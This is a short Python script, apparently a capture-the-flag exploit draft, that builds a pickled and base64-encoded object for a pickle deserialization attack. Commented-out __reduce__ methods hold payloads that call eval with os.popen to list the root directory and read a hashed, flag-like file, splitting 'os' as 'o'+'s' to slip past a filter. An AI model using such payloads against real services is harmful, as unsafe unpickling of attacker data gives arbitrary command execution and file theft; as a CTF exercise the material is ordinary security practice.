#exp
import os
import pickle
import base64
import favorite

print(favorite.name)
class Animal():
   def __init__(self,name):
       self.name=name
   # def __reduce__(self):
      #return (print,(favourite.name,))
      #return (eval,("__import__('o'+'s').popen('ls / ').read()",))
      #return (eval,("__import__('o'+'s').popen('cat ef47c37380ebc566ed8d2a5b0770b3f1').read()",))
a = Animal("a")
print(a)
b=pickle.dumps(a)
print(b)
print(base64.b64encode(b))
